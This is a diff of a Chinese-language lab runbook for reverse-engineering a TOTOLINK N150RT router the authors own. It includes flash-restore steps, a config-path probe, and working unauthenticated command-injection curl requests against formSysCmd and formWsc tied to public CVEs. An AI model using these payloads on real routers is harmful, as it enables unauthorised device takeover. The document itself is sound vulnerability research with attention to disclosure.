@@ -14,8 +14,8 @@
 | 站 | 板子在什麼狀態 | 進這一站的代價 | 節 |
 |---|---|---|---|
 | **第 1 站** | 不碰裝置 | 免費 | `A1.1` – `A1.4` |
-| **第 2 站** | 停在 `<RealTek>`（搶到 bootloader） | **一次開機循環** | `A2.1` – `A2.5` |
-| **第 3 站** | 正常開機、web 服務中 | **一次開機循環 + 45 秒** | `A3.1` – `A3.8` |
+| **第 2 站** | 停在 `<RealTek>`（搶到 bootloader） | **一次開機循環** | `A2.1` – `A2.6` |
+| **第 3 站** | 正常開機、web 服務中 | **一次開機循環 + 45 秒** | `A3.1` – `A3.12` |
 | **第 4 站** | 不碰裝置 | 免費 | `A4.1` – `A4.2` |
 
 **從 `A1.1` 讀到 `A4.2`，那就是一個正確的執行順序** —— 這是分站的全部理由。
@@ -33,22 +33,27 @@
 | `A1.1` | `make doctor`：讓機器自己說它準備好了沒 | — |
 | `A1.2` | 從一份 clone 跑到全部報告，外加 89 個守衛案例 | — |
 | `A1.3` | 從 dump 讀出 bootloader 能不能傳 kernel cmdline | `P9-1` |
-| `A1.4` | 用 qemu-user 把這台自己的 binary 跑在 x86 上 | `P3-0` `P3-6` |
+| `A1.4` | 用 qemu-user 把這台自己的 binary 跑在 x86 上 | `P3-0` `P3-6` `P0-9` |
 | **第 2 站** | **板子停在 `<RealTek>`** | |
 | `A2.1` | 把 CP2102 與 USB 網卡交給 WSL | — |
 | `A2.2` | 連續 ESC 搶下 bootloader，停在 `<RealTek>` | `P0-2` |
 | `A2.3` | 純讀 64 KiB 設定區：還原點 + IoC 基準 | `P0-10` `P0-5` |
 | `A2.4` | 進救援模式，而且不上傳任何東西 | `P9-3` |
 | `A2.5` | **`FLW` 寫入演練 —— 全檔唯一不可逆的一節** | `P0-3` |
+| `A2.6` | **把設定區寫回去 —— 16 KiB，不是 8 個 byte** | `P10-10` |
 | **第 3 站** | **板子正常開機、web 服務中** | |
 | `A3.1` | 設好網段，並且**證明**封包是直連不是繞道 | `P1-1` |
 | `A3.2` | 一次冷開機同時量到「幾秒可服務」與 kernel cmdline | `P1-12` |
 | `A3.3` | 抓封包證明線上只有你和它，而且帶對照組 | `P0-4` |
 | `A3.4` | 全 TCP + 重點 UDP + IoC 埠 | `P1-2` `P6-11` `P1-10` |
 | `A3.5` | GET 那半邊：指紋、授權閘門、寫入類 handler | `P1-3` `P1-5` `P1-8` `P2-1` `P2-2` `P2-3` `P2-4` `P2-5` `P3-13` |
-| `A3.6` | 未認證 `GET /config.dat`，拿去跟 flash `0xC000` 逐 byte 比 | `P10-1` |
+| `A3.6` | 未認證 `GET /config.dat`，拿去跟 flash `0xC000` 逐 byte 比 | `P10-1` `P10-2` |
 | `A3.7` | 用解出來的密碼登入，並證明這個 build 沒有 session | `P2-7` `P2-8` |
 | `A3.8` | **POST 那半邊 —— 會改設定，而且會把 web server 弄掉** | `P1-4` `P1-5` `P1-6` |
+| `A3.9` | ★ **未認證命令注入 —— 三個標的、三種 oracle** | `P3-3` `P3-1` `P3-2` `P3-4` `P3-7` `P5-5` |
+| `A3.10` | ★ **第 ⑤ 環：指著 flash 上被改掉的那幾個 byte** | `P3-5` |
+| `A3.11` | **未認證改管理密碼，以及把它設成空字串** | `P10-3` `P10-4` |
+| `A3.12` | **會把 `boa` 弄掉的那一梯次 —— 排在最後** | `P4-1` `P4-2` `P4-3` `P4-4` `P2-6` |
 | **第 4 站** | **收工 —— 不碰裝置** | |
 | `A4.1` | 把結果登記進去，重生成登記簿 | — |
 | `A4.2` | 症狀 → 原因 → 回到哪一節 | — |
@@ -386,7 +391,7 @@ kernel: LZMA at payload+0x2808, 3,374,772 bytes, declared size MATCHES
 
 ---
 
-### A1.4 模擬環境：這台自己的 binary，跑在 x86 上（關 `P3-0` · `P3-6`）
+### A1.4 模擬環境：這台自己的 binary，跑在 x86 上（關 `P3-0` · `P3-6` · `P0-9`）
 
 | 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
 |---|---|---|---|
@@ -452,12 +457,14 @@ sudo bash tools/qemu-env.sh diff HW_WLAN0_WSC_PIN 87654321
 
 ## 第 2 站 · 板子停在 `<RealTek>`
 
-**照順序** `A2.1` → `A2.2` → `A2.3` → `A2.4` → `A2.5`
+**照順序** `A2.1` → `A2.2` → `A2.3` → `A2.4` → `A2.5` → `A2.6`
 
 **進站**：板子**確實斷電** → 先跑 `A2.2` 的 `catch` → 看到提示才上電 → 連續 ESC → 停在 `<RealTek>`。
 **出站**：拔電。**不要**從這個狀態直接 `J` 或讓它繼續開機。
 
-> 🔴 **這五節排在一起，是因為進站要燒掉一個開機循環。** 進來一次就把要讀的全部讀完；為了漏掉的一節再進站一次，就是再燒一次，而 `A2.2` 說了抓不到不要重試超過三次。
+> 🔴 **這六節排在一起，是因為進站要燒掉一個開機循環。** 進來一次就把要讀的全部讀完；為了漏掉的一節再進站一次，就是再燒一次，而 `A2.2` 說了抓不到不要重試超過三次。
+
+> 🔴 **`A2.5` 與 `A2.6` 是全檔僅有的兩節會寫 flash，而順序是硬的**：`A2.5` 在沒有活資料的 `0x3F0000` 上量 `FLW` 的語意，`A2.6` 才拿那個語意去寫真的設定區。**跳過 `A2.5` 直接跑 `A2.6`，等於用一個沒量過的行為去寫唯一一份資料。**
 
 ### A2.1 🔌 把 USB 裝置交給 WSL（不關登記簿項目）
 
@@ -1035,31 +1042,177 @@ xxd "$HOME/fwre-work/dumps/probe.bin"
 
 ---
 
-#### W06 要用它做什麼：還原 16 KiB，不是 8 個 byte
+#### 這一節與 `A2.6` 的分工
+
+**本節寫 8 個 byte 到沒有活資料的地方，只為了知道 `FLW` 在這台上到底是什麼語意。**
+真的把資料寫回去是 `A2.6`，而它有一支工具、一份 sha256、一個磁區對齊的要求。
+**先跑完本節再去 `A2.6`** —— 演練是那一節的先決條件，不是禮貌。
+
+---
+
+### A2.6 🔌🔴 把設定區寫回去 —— 16 KiB，不是 8 個 byte（關 `P10-10`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| T2 | **不可逆** | [`RUNBOOK` §8.12.17](RUNBOOK.md) | 未執行過（撰於 2026-08-17） |
+
+**先決條件**：`A2.5` 六步全過（`P0-3`）；板子停在 `<RealTek>`；來源檔與它的 sha256 在手上
 
 2026-08-17 的 POST 輪把 `COMPDS`（`0x8000`–`0xC000`）覆寫成 `COMPCS` 了。
-還原的來源是 `config-region-20260817-1102-pre.bin`
-（與 8/16 完整 dump 的前 64 KiB 逐 byte 相同）。
+來源是 `config-region-20260817-1102-pre.bin`，**與 8/16 完整 dump 的前 64 KiB 逐 byte 相同**
+—— 兩份獨立的副本說同一件事，這是動手前唯一該確認的事。
 
-**這比演練難的地方有三個，先想清楚再開始：**
+**這比演練難的地方有三個：**
 
-1. **16 KiB = 4 個磁區**，而 `EB` 一次只灌幾個 byte。**手打灌不動 16 KiB。**
-   需要一支寫入端的工具，而目前**沒有** —— `console-dump.py` 刻意送不出 `FLW`。
-   **那支工具要先寫、要有守衛套件、而且要在演練區 `0x3F0000` 驗過，才准指向 `0x8000`。**
-2. **每一個磁區都是讀-改-抹-寫回**，所以寫到一半斷電失去的是那 4 KiB。
-   `COMPDS` 壞掉不致命（裝置自己會用它修 `COMPCS`，反過來就不行了） ——
-   **但要在動手前確認方向，不要在寫壞之後才想。**
-3. **還原之後要重新建立 IoC 基準**（`A2.3` 的 `tools/ioc-precheck.sh`），
-   而預期值是**還原後應該回到 4 / 343**。**那一步就是這次還原的驗證。**
+1. **16 KiB = 4 個磁區**，而 `EB` 一次只灌幾個 byte。手打灌不動。
+2. **每個磁區都是讀-改-抹-寫回**，所以寫到一半斷電失去的是那 4 KiB。
+   方向要先想清楚：**`COMPDS` 壞掉不致命**（`/bin/startup.sh` 會用它修 `COMPCS`），
+   **反過來不成立**。所以先寫 `COMPDS` 這一邊是對的順序。
+3. **還原完要重新建立 IoC 基準**，而預期值是回到 **4 / 343**。那一步就是驗證。
+
+#### A2.6.1 先量 `EB` 一行吃幾個 byte（**只碰 RAM，一個 byte 都不寫 flash**）
+
+```bash
+python3 -u tools/console-write.py probe-eb --at-prompt \
+        --sizes 8 16 32 64 -o "$HOME/fwre-work/dumps/w06-eb-probe.json"
+```
+
+**預期**（實際數字未知 —— 這一節就是為了量它）：
+
+```text
+  ok      8 bytes on one line: 8/8 landed
+  ok     16 bytes on one line: 16/16 landed
+  fail   32 bytes on one line: 16/32 landed
+
+  ok    EB takes 16 bytes on one line on this unit
+        16 KiB would need 1024 EB commands
+```
+
+> ⚠️ **`runsheet` 到 2026-08-17 為止只知道「多 byte 形式可以」，不知道上限。**
+> 猜錯的代價不是慢，是**一行只進第一個 byte 而其餘被丟掉**，而那在 flash 上
+> 看起來就是一份「寫壞了」的設定區。`A2.6.3` 的 RAM 回讀會擋住它，但先量掉更便宜。
+
+> ❌ **一個 byte 都沒進去 → 停。** 灌不進 RAM 就不可能寫得進 flash，而
+> `EB` 失敗代表這個 loader 跟 2026-08-17 那次不是同一個行為，先弄清楚為什麼。
+
+#### A2.6.2 用工具自己再演練一次 `0x3F0000`
+
+**`A2.5` 演練的是你的手，這一步演練的是這支工具。** 兩者不能互相取代：
+`A2.5` 證明 `FLW` 在這台上的語意，`A2.6.2` 證明**這支程式**送出去的 `FLW` 是對的。
+
+```bash
+python3 -u tools/console-write.py drill --at-prompt --eb-bytes 16 \
+        -o "$HOME/fwre-work/dumps/w06-drill.json"
+```
+
+**預期**：六步全部 `ok`，其中第五步印出 `the first pattern survived -> FLW preserves the sector`。
+
+> 🔴 **第五步印的是 `erase-whole-sector` → 不要繼續。** 那跟 2026-08-17 的量測相反，
+> 而兩次量到不同語意的意思是「有一個量錯了」，不是「裝置變了」。回 `A2.5` 手動重做一次。
+
+#### A2.6.3 切出那 16 KiB，並且算它的 sha256
+
+```bash
+D="$HOME/fwre-work/dumps"
+dd if="$D/config-region-20260817-1102-pre.bin" bs=1 skip=32768 count=16384 \
+   status=none of="$D/compds-restore.bin"
+sha256sum "$D/compds-restore.bin"
+# 對照組：同一段 bytes 從 8/16 的完整 dump 切出來，必須一模一樣
+dd if="$D/flash-n150rt-console-1.bin" bs=1 skip=32768 count=16384 \
+   status=none | sha256sum
+```
+
+**預期**：兩個 sha256 相同。
+
+> 🔴 **`32768` 是 `0x8000`，`16384` 是 `0x4000`，兩個都是十進位** —— `dd` 不吃 `0x`。
+> 這台已經用兩種進位制咬過人一次（`FLR` 長度十六進位、`DB` 長度十進位）。
+
+> ❌ **兩個 sha256 不同 → 停，而且不要挑一個來寫。** 兩份副本本來就該相同，
+> 不同代表其中一份不是你以為的那一份，**而你正要把它燒進去**。
+
+#### A2.6.4 空跑一次，把要送的命令看過
+
+```bash
+python3 tools/console-write.py write --dry-run \
+        --flash 0x8000 --confirm 0x8000 --length 0x4000 \
+        --input "$HOME/fwre-work/dumps/compds-restore.bin" \
+        --expect-sha256 <把 A2.6.3 的 sha256 貼進來> --eb-bytes 16
+```
+
+**預期**：`4 sector(s), one FLW each`，然後前 12 行命令。**`FLW` 的參數順序是
+`<flash> <RAM> <長度>`，跟 `FLR` 相反 —— 在這裡看一遍就好，不要在真的送的時候才看。**
+
+#### A2.6.5 ★ 寫入
+
+```bash
+python3 -u tools/console-write.py write --at-prompt \
+        --flash 0x8000 --confirm 0x8000 --length 0x4000 \
+        --input "$HOME/fwre-work/dumps/compds-restore.bin" \
+        --expect-sha256 <同上> --eb-bytes 16 \
+        -o "$HOME/fwre-work/dumps/w06-compds-restore.json"
+```
+
+**預期**：正對照通過、四個磁區各自 `staged and verified in RAM` 之後才 `FLW ok`、
+最後整段讀回第三個位址比對相同。
+
+> 🔴 **這一步大約要跑 1–3 分鐘（1024 個 `EB` 加 4 個 `FLW`）。**
+> **中途不要拔電、不要按 Ctrl-C。** 每個磁區都是讀-改-抹-寫回，
+> 斷在中間失去的是那 4 KiB 而不是你正在寫的那幾個 byte。
+
+> ❌ **任何一個磁區停在 `staged RAM does not match` → 那個磁區還沒被寫**，
+> 工具就是為了在這裡停。降低 `--eb-bytes` 再跑一次，不要略過。
+
+#### A2.6.6 驗證：重新抓快照，並確認回到 4 / 343
+
+```bash
+D="$HOME/fwre-work/dumps"
+python3 -u tools/console-dump.py dump --at-prompt \
+        --flash 0x0 --length 0x10000 --ram 0x81000000 --chunk 16384 \
+        -o "$D/config-region-restored.bin"
+cmp "$D/config-region-20260817-1102-pre.bin" "$D/config-region-restored.bin" \
+  && echo "IDENTICAL to the pre-sweep snapshot"
+bash tools/config-attrib.sh "$D/config-region-20260817-1102-pre.bin" \
+                            "$D/config-region-restored.bin"
+```
+
+**預期**：`cmp` 說完全相同 —— **注意這比「4 / 343」更強**。
+`COMPCS` 那一半是 8/17 POST 輪改過的、**現在也一起被寫回 8/16 的狀態**？
+**不是。** 本節只寫 `0x8000`–`0xC000`，`0xC000` 以後沒有動，
+所以 `cmp` **會**在 `0xC000` 之後報出差異，而 `0x8000`–`0xC000` 之前必須完全一致。
+
+> 🔴 **所以正確的判據是分段的，不是一個 `cmp`：**
+>
+> ```bash
+> for r in 0:32768 32768:16384 49152:16384; do
+>   o=${r%:*}; n=${r#*:}
+>   a=$(dd if="$D/config-region-20260817-1102-pre.bin" bs=1 skip="$o" count="$n" status=none | sha256sum | cut -c1-16)
+>   b=$(dd if="$D/config-region-restored.bin"          bs=1 skip="$o" count="$n" status=none | sha256sum | cut -c1-16)
+>   [ "$a" = "$b" ] && echo "same  $o+$n" || echo "DIFF  $o+$n"
+> done
+> ```
+>
+> **預期**：`same 0+32768`（loader 與 `H601` 沒動）、`same 32768+16384`（`COMPDS` 還原了）、
+> `DIFF 49152+16384`（`COMPCS` 是 8/17 的現況，本來就該不同）。
+>
+> ❌ **前兩行任何一行是 `DIFF` → 停。** 尤其第一行：那裡面有 `H601`。
+
+> ⚠️ **`COMPDS` 還原之後，`P9-9`（reset 按鈕）在 W07 才有意義** ——
+> 8/17 那次 POST 輪把兩區弄成一樣，reset 的預測因此無法判別。現在可以了。
 
 ---
 
 ## 第 3 站 · 板子正常開機、web 服務中
 
 **照順序** `A3.1` → `A3.2` → `A3.3` → `A3.4` → `A3.5` → `A3.6` → `A3.7` → `A3.8`
+→ `A3.9` → `A3.10` → `A3.11` → `A3.12`
 
 **進站**：從第 2 站拔電 → 停 2 秒 → 上電，**這一次不要送 ESC** → 等 45 秒。
 **出站**：拔電，或留著給下一場。
+
+> 🔴 **後四節的順序是硬的，而理由是依賴關係不是危險程度：**
+> `A3.9`（注入）要先成立，`A3.10`（flash 差異）才知道自己在量什麼；
+> `A3.11`（改密碼）**會毀掉 `A3.6`+`A3.7` 那條 CVE-2019-19822 → 19823 的鏈**，
+> 所以它必須排在那兩節之後；`A3.12` 會把 `boa` 弄掉，**所以它排最後**。
 
 > ⚠️ **`A3.1`（網段）其實不需要板子在這一站** —— 它只要板子有電，停在 `<RealTek>` 也算。它排在最前面的理由是 `A3.2` 的輪詢需要位址已經設好。
 >
@@ -1739,7 +1892,7 @@ formWlanRedirect2 302 / 131B     ← 與不存在的名字無異
 
 ---
 
-### A3.6 🔌 ★ `GET /config.dat` —— 一條四層都指得出來的證據鏈（關 `P10-1`）
+### A3.6 🔌 ★ `GET /config.dat` —— 一條四層都指得出來的證據鏈（關 `P10-1` · `P10-2`）
 
 | 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
 |---|---|---|---|
@@ -1822,6 +1975,74 @@ IDENTICAL
 ```
 
 然後拿那組值去跑 `A3.7` —— **它會通**。
+
+#### A3.6.4 還有沒有別的設定檔拿得到（關 `P10-2`）
+
+**`/config.dat` 不是唯一要問的路徑，而字典不用亂猜** —— 這台的 docroot 是
+`flash extr /web` 從 flash 展開的，`webbundle-unit-2018.json` 裡有它全部 143 個檔名。
+**所以字典用實際檔名，不是通用清單。**
+
+```bash
+python3 - reports/webbundle-unit-2018.json <<'PY' > /tmp/w06-paths.txt
+import json, sys
+d = json.load(open(sys.argv[1]))
+# 兩份清單都要：bundle 的實際檔名證明「只有這些」，常見疑犯證明「連常見的也沒有」。
+# 少了後者，一個全 404 的結果什麼都不代表。
+extra = ["config.dat", "config.bin", "backup.dat", "romfile.cfg", "cfg.dat",
+         "nvram.bin", "settings.dat", "config.dat.bak", "sysconf.dat",
+         "COMPCS", "config", "backup_settings.conf", "var/config.dat"]
+seen = set()
+for e in d["entries"]:
+    n = e["name"]
+    if n not in seen:
+        seen.add(n)
+        print(n)
+for n in extra:
+    if n not in seen:
+        print(n)
+PY
+wc -l < /tmp/w06-paths.txt
+```
+
+**預期**：`156`（bundle 的 143 個檔名，加上 13 個不在裡面的疑犯）。
+
+```bash
+n=0
+while read -r p; do
+  n=$((n + 1))
+  printf '%s %s\n' "$(curl -s -o /dev/null -w '%{http_code}' -m 5 \
+                      "http://10.1.1.1/${p#/}")" "$p"
+  if [ $((n % 40)) -eq 0 ]; then
+    curl -sf -m 5 -o /dev/null http://10.1.1.1/ && echo "--- control $n: server alive"
+  fi
+done < /tmp/w06-paths.txt | tee "$HOME/fwre-work/dumps/w06-config-paths.txt"
+sort "$HOME/fwre-work/dumps/w06-config-paths.txt" | awk '{print $1}' | uniq -c
+```
+
+**預期 —— 而這一輪的重點是那 13 個疑犯，不是那 143 個檔名：**
+
+```text
+200 config.dat
+404 config.bin
+404 backup.dat
+...
+--- control 40: server alive
+```
+
+**`config.dat` 是 13 個疑犯裡唯一回 200 的**，而它**不在 bundle 的 143 個檔名裡**
+——`boa` 啟動時自己建的（`A3.6.1` 那三行 `strace`）。**其餘 12 個一個都不該存在。**
+
+bundle 那 143 個的分佈是 `A3.5` 閘門模型的複驗：`.htm` 多數 `302`（69 個被擋、7 個放行），
+非 `.htm`（`.js` / `.css` / `.gif`）一律 `200` —— **因為閘門看的是路徑裡有沒有 `htm`。**
+
+> ❌ **那 12 個疑犯裡任何一個回 200 → 停下來。** 那代表 docroot 不只是
+> `flash extr /web` 展開的內容，而 `P1-3`、`P3-10`、`P3-11` 三項的預測都建立在
+> 「docroot 就是那 143 個檔」上面。**先把那個檔是誰放的查清楚。**
+
+> ⚠️ **這一輪是純 GET，但它有 150 次以上的請求。** `A3.8` 量到這台的 web server
+> 是單行程、而且一個畸形 POST 就能佔住它 4–10 秒。GET 沒有那個問題（`A3.5` 打了
+> 76 個頁面沒事），但**每 40 個請求回頭 `curl -sf http://10.1.1.1/ ` 確認一次**，
+> 否則後面整串 000 你分不出是「檔案不在」還是「server 不在」。
 
 #### 為什麼這一節值得單獨存在
 
@@ -2128,6 +2349,476 @@ raw: 14068 of 65536 bytes differ
 > **但 `NOTICE_ENABLED` 變成 208** —— 一個布林欄位裝了 208,
 > 代表某個 handler 把它 accessor 對「參數缺席」回的值寫了進去，而那既不是 0 也不是 1。
 > **那是一條線索，不是結論。**
+
+---
+
+### A3.9 🔌 ★ 未認證命令注入 —— 三個標的、三種 oracle（關 `P3-3` · `P3-1` · `P3-2` · `P3-4` · `P3-7` · `P5-5`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| T3 | **A1 的第一發是零副作用；之後會寫 `/var`（ramfs），`A3.10` 才寫 flash** | [`RUNBOOK` §8.12.18](RUNBOOK.md) | 未執行過（撰於 2026-08-17） |
+
+**先決條件**：`A3.1` 網段；`A2.3` 的前置快照已抓；[`docs/disclosure.md`](docs/disclosure.md)
+已寫明本節每個標的的狀態；主機端 `tcpdump` 已在跑
+
+#### A3.9.0 順序是 ICMP → docroot → flash，而順序本身是方法
+
+**這個漏洞是盲注：`system()` 的輸出不會進 HTTP 回應。**
+`formSysCmd` 的組字串在 binary 裡是 `%s 2>&1 > %s` —— 你送的命令在**前面**，
+後面接著把 stdout 導去 `/tmp/syscmd.log`。所以「看回應有沒有 `uid=0`」在這台上
+**永遠不會發生**，而 W06 的整個設計就是繞開那件事。
+
+| oracle | 副作用 | 它證明什麼 |
+|---|---|---|
+| **ICMP** | **零**。不寫任何儲存 | 命令執行了 |
+| **docroot 回寫** | 寫 `/var/web`，而 `/var` 是 ramfs（`rcS` 第 10 行 `mount -t ramfs`），**重開就沒了** | 命令的**輸出**拿得回來 |
+| **flash 差異**（`A3.10`） | 寫非揮發性儲存 | 命令改了矽晶片上的 byte |
+
+> 🔴 **先用零副作用的確認注入成立，再用有副作用的取最強證據。**
+> 反過來做，第一發就寫壞了的話，你連「注入到底成不成立」都不知道。
+
+#### A3.9.1 對照組：先證明你抓得到 ICMP
+
+```bash
+sudo tcpdump -ni eth1 -w "$HOME/fwre-work/dumps/w06-icmp.pcap" icmp &
+sleep 2
+ping -c 2 10.1.1.1
+sudo pkill -f 'tcpdump -ni eth1' ; sleep 1
+tshark -r "$HOME/fwre-work/dumps/w06-icmp.pcap" -T fields -e ip.src -e ip.dst -e icmp.type
+```
+
+**預期**：四列，`10.1.1.10 → 10.1.1.1` type 8 與 `10.1.1.1 → 10.1.1.10` type 0 各兩筆。
+
+> ❌ **抓不到 → 停，先修抓包。** 之後注入那一發沒有封包時，你必須能區分
+> 「命令沒執行」和「我沒在聽」。**先把後者排除掉，這一節才有判別力。**
+> `eth1` 這個名字**不要假設** —— 用 `A3.1` 量出來的那個介面名。
+
+#### A3.9.2 ★ A1：`formSysCmd`，ICMP oracle，**不帶任何憑證**（關 `P3-3`）
+
+```bash
+sudo tcpdump -ni eth1 -w "$HOME/fwre-work/dumps/w06-p33.pcap" icmp &
+sleep 2
+curl -s -o /dev/null -w 'HTTP %{http_code}  %{time_total}s\n' \
+  -X POST http://10.1.1.1/boafrm/formSysCmd \
+  --data-urlencode 'sysCmd=ping -c 3 10.1.1.10' \
+  --data 'submit-url=/syscmd.htm'
+sleep 4
+sudo pkill -f 'tcpdump -ni eth1' ; sleep 1
+tshark -r "$HOME/fwre-work/dumps/w06-p33.pcap" -T fields -e ip.src -e ip.dst -e icmp.type
+```
+
+**預期**：
+
+```text
+HTTP 302  0.012s
+10.1.1.1	10.1.1.10	8
+10.1.1.1	10.1.1.10	8
+10.1.1.1	10.1.1.10	8
+```
+
+> 🔴 **判據是「來源是 `10.1.1.1` 的 type 8」** —— 也就是**路由器主動發出**的 echo
+> **request**。`A3.9.1` 對照組裡路由器送的是 type 0（reply）。
+> **方向與型別一起看，才分得出「它回了我」和「它替我跑了 ping」。**
+
+> ⚠️ **`302` 不代表成功也不代表失敗。** 這個 handler 無論如何都會 302
+> （`A3.8` 量過：帶 `submit-url` 的空 POST 也回 302 → `status.htm`）。
+> **HTTP 回應在這一節裡沒有判別力，那正是這一節存在的理由。**
+
+> ❌ **沒有任何 ICMP → 不要立刻換 payload。** 先確認三件事，順序固定：
+> （a）`A3.9.1` 的對照組現在還過嗎（server 可能被前面某一節弄掉了）；
+> （b）`curl` 真的送出去了嗎（`-w` 的 `http_code` 是 `000` 就是沒送到）；
+> （c）**參數名對嗎** —— `sysCmd` 大小寫敏感，來源是 `/bin/boa` 的字串表。
+> 三個都沒問題才是「參數在到達 `system()` 之前被擋掉了」，而那是 `P3-3` 的反證條件。
+
+> 🔴 **這一發成立 = CVE-2024-51228 在這台上重現，而且是未認證。**
+> NVD 給它 `PR:H`（需要高權限）。**這一發沒有帶任何憑證** ——
+> 那就是 [`docs/disclosure.md`](docs/disclosure.md) `D-6` 的全部內容，
+> 而它從 `held` 變成可發布就靠這一步。**下一步把它講精確。**
+
+#### A3.9.3 同一發，帶憑證 —— 把「未認證」講到能被反駁
+
+```bash
+# 憑證來自 A3.6.3 從自己的 flash 解出來的那一組,不是猜的
+curl -s -o /dev/null -w 'with credentials: HTTP %{http_code}\n' \
+  -u '<USER_NAME>:<USER_PASSWORD>' \
+  -X POST http://10.1.1.1/boafrm/formSysCmd \
+  --data-urlencode 'sysCmd=ping -c 1 10.1.1.10' --data 'submit-url=/syscmd.htm'
+```
+
+**預期**：一樣是 `302`，一樣有 ICMP。**兩者行為相同，就是「認證與否不影響」** ——
+比只做未認證那一發強，因為它排除了「其實我不小心帶了什麼」。
+
+#### A3.9.4 docroot oracle —— 以及為什麼少了 `;#` 會拿到一個空檔
+
+```bash
+curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
+  --data-urlencode 'sysCmd=cat /etc/version > /var/web/w06.txt;#' \
+  --data 'submit-url=/syscmd.htm'
+sleep 2
+curl -s http://10.1.1.1/w06.txt
+```
+
+**預期**：
+
+```text
+TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002
+```
+
+> 🔴 **`;#` 不是裝飾。** handler 組出來的是 `%s 2>&1 > %s`，也就是
+> `cat /etc/version > /var/web/w06.txt 2>&1 > /tmp/syscmd.log`，而 `sh` 裡
+> **最後一個 stdout 重導向贏** —— 檔案會被建立，然後是空的。
+> `;#` 把後面整段註解掉。**空檔和被過濾掉，看起來完全一樣。**
+
+> ★ **這一行輸出同時是三件事**：命令執行的證據、**這台的 build 字串**、
+> 以及 `CX` 那個發現的現場 —— `/etc/version` 有 `CX`，而 `status.htm` 沒有。
+
+> ⚠️ **`PROGRESS` 開放 #18：`boa.conf` 設了 `DirectoryCache /tmp`，
+> 而「開機後才建立的檔案 `boa` 服不服務」從來沒測過。**
+> 這一步**就是**那個測試。拿不回來 → 先別怪注入：`A3.9.2` 的 ICMP 已經
+> 證明命令跑了，所以拿不回來是 **oracle** 的問題不是注入的問題，
+> 而那個區別正是排這個順序的理由。
+
+#### A3.9.5 `P5-5`：`/proc/cpuinfo` —— W02 開放 #6 的最後一塊（關 `P5-5`）
+
+```bash
+curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
+  --data-urlencode 'sysCmd=cat /proc/cpuinfo > /var/web/cpu.txt;#' \
+  --data 'submit-url=/syscmd.htm'
+sleep 2
+curl -s http://10.1.1.1/cpu.txt
+```
+
+**預期**：一段 `system type` / `cpu model` 之類的欄位。**要看的是核心名字。**
+
+> ★ **這一格從 W02 開到現在。** SoC 是 RTL8196E，而它常被記載成 RLX5281 核心
+> （對上 8196C 的 RLX4181），這件事直接影響 W01 讀出來的「MIPS-I」。
+> `/proc/cpuinfo` 一行就答完，而**這台沒有 shell** ——
+> 所以它一直答不了，直到命令注入成立。
+>
+> **反過來也要看**：`P5-5` 的預測是「`boa` 用了 142 次 `lwl`/`lwr`/`swl`/`swr`，
+> 所以跑它的核心必須實作這些指令」。cpuinfo 顯示的核心**不**支援 → 那不是
+> cpuinfo 錯，是**那 142 個計數量錯了、或那些程式路徑從來沒被執行過**。
+
+#### A3.9.6 另外三個標的（關 `P3-1` · `P3-2` · `P3-4`）
+
+**三個標的的揭露狀態不一樣，而這一節的寫法就因此不一樣。**
+
+| | 標的 | 狀態 | 這裡怎麼寫 |
+|---|---|---|---|
+| **A2** | `formWsc` / `peerPin` | CVE-2025-3987 / 4462，**已公開** | 完整命令 |
+| **A3** | `formRoute` / `subnet` | **`docs/disclosure.md` `D-1`，未通報** | **只給形狀，不給可貼上的請求** |
+| **A4** | `formWsc` / `targetAPSsid` | CVE-2025-6299，**已公開** | 完整命令 |
+
+```bash
+# A2 —— peerPin 只寫 /var,重開就乾淨,所以排在 localPin(A3.10)之前
+sudo tcpdump -ni eth1 -w "$HOME/fwre-work/dumps/w06-p31.pcap" icmp &
+sleep 2
+curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formWsc \
+  --data-urlencode 'peerPin=1;ping -c 3 10.1.1.10;#' \
+  --data 'submit-url=/wireless.htm'
+sleep 4 ; sudo pkill -f 'tcpdump -ni eth1' ; sleep 1
+tshark -r "$HOME/fwre-work/dumps/w06-p31.pcap" -T fields -e ip.src -e icmp.type
+```
+
+```bash
+# A4 —— 預期不是命令注入而是溢位:R2 的 6 個 site 不含 targetAPSsid
+curl -s -o /dev/null -w 'A4: HTTP %{http_code}\n' -X POST http://10.1.1.1/boafrm/formWsc \
+  --data-urlencode 'targetAPSsid=1;ping -c 3 10.1.1.10;#' \
+  --data 'submit-url=/wireless.htm'
+```
+
+> 🔴 **A3（`formRoute` / `subnet`）的請求不寫在這裡，而這不是疏漏。**
+> 它是這個專案自己找到的、**沒有 CVE 編號、還沒通報任何人**的一條。
+> repo 的規則是：**發現可以公開，重現要跟著揭露狀態走。**
+> 指出 handler 與參數名是發現（`test-ledger.md` 的 `P3-2` 那一列已經寫了）；
+> 給一個可以複製貼上的請求不是。
+>
+> **操作上**：用 A2 完全相同的請求形狀，handler 與參數名照 `P3-2` 那一列，
+> `submit-url` 用 `/route.htm`。**判據也一樣：來源 `10.1.1.1` 的 type 8。**
+>
+> ⚠️ **這一發打的是路由設定。** 一個參數缺席的 POST 就可能改掉這台的路由表，
+> 而你正是從那條路徑連進去的。**前後快照（`A2.3`）一定要有。**
+
+#### A3.9.7 `P3-7`：改用 GET，以及 submit 按鈕名（關 `P3-7`）
+
+```bash
+# 1) 同一個 handler,參數放在 query string
+curl -s -o /dev/null -w 'GET  : HTTP %{http_code}\n' \
+  "http://10.1.1.1/boafrm/formSysCmd?sysCmd=ping%20-c%203%2010.1.1.10&submit-url=/syscmd.htm"
+# 2) POST,但加上不同的 submit 按鈕名
+for b in submit-url Apply save "Save Setting"; do
+  curl -s -o /dev/null -w "btn=$b : HTTP %{http_code}\n" \
+    -X POST http://10.1.1.1/boafrm/formSysCmd \
+    --data-urlencode 'sysCmd=ping -c 1 10.1.1.10' --data-urlencode "$b=/syscmd.htm"
+done
+```
+
+**預期**：GET 那一發**不會**執行 —— `A3.5` 量到所有 `/boafrm/formX` 的 GET
+都在 `translate_uri` 就被 302 掉，根本到不了 `handleForm`。
+
+> ★ **GET 不通是好消息，而且它是一個可以講的結論**：這條注入**不能**用一個
+> `<img src=...>` 從瀏覽器打出去。**但這台沒有 session、用的是 HTTP Basic**
